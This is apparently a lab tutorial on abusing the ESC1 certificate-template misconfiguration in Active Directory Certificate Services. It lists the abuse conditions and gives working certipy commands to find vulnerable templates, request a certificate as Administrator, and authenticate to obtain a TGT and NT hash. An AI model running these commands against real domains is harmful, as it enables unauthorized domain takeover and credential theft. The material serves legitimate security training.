## Understanding ESC1

The primary misconfiguration behind this domain escalation scenario lies in the possibility of specifying an alternate user in the certificate request. This means that if a certificate template allows including a subjectAltName ( `SAN` ) different from the user making the certificate request (CSR), it would allow us to request a certificate as any user in the domain.

## ESC1 Abuse Requirements

To abuse ESC1 the following conditions must be met:
1. The Enterprise CA grants enrollment rights to low-privileged users.
2. Manager approval should be turned off (social engineering tactics can bypass these security measures).
3. No authorized signatures are required.
4. The security descriptor of the certificate template must be excessively permissive, allowing low-privileged users to enroll for certificates.
5. The certificate template defines EKUs that enable authentication.
6. The certificate template allows requesters to specify a subjectAltName (SAN) in the CSR .
### Finding Vulnerabilities in ADCS
```
certipy find -u '[email protected]' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout
```

To confirm the target is vuln information, we can also identify the conditions that make this template vulnerable to ESC1 :
- Enrollment Rights: LAB.LOCAL\Domain Users .
- Requires Manager Approval: False .
- Authorized Signature Required: 0 .
- Client Authentication: True or Extended Key Usage Client Authentication .
- Enrollee Supplies Subject: True .

### ESC1 Abuse from Linux

To abuse the ESC1 vulnerable template, we must use certipy to request a Certificate and include the alternate subject. We can do this using the option req to request a certificate
and the option -upn Administrator to specify we want to include an alternative subject (in this case, the Administrator):
```
certipy req -u '[email protected]' -p 'Password123!' -dc-ip 10.129.205.199 -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
```

The above commands create a certificate file named `administrator.pfx` , we can use that certificate to authenticate as the Administrator :

```
certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199
```

To authenticate, we can use the TGT saved in administrator.ccache . Additionally, certipy also retrieves the NT hash of the account Administrator using the information in the certificate request.

> [!NOTE]
 If we get an error: The NETBIOS connection with the remote host timed out ,  just try again.
